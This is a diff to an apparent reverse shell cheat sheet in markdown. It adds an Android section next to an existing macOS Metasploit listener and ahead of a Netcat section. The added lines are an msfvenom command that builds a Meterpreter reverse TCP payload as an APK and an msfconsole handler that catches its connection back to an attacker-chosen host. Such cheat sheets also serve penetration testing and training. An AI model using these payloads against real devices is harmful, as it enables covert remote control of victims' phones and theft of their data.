@@ -39,6 +39,18 @@ MSFConsole Listener
 ```
 msfconsole -x "use exploit/multi/handler; set payload osx/x64/meterpreter/reverse_tcp; set LHOST <Your_IP>; set LPORT <Your_Port>; exploit"
 ```
+
+**Android**
+MSFVenom Payload
+```
+msfvenom -p android/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -o payload.apk
+```
+
+MSFConsole Listener
+```
+msfconsole -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST <Your_IP>; set LPORT <Your_Port>; exploit"
+```
+
 ### Netcat
 
 **Windows** 
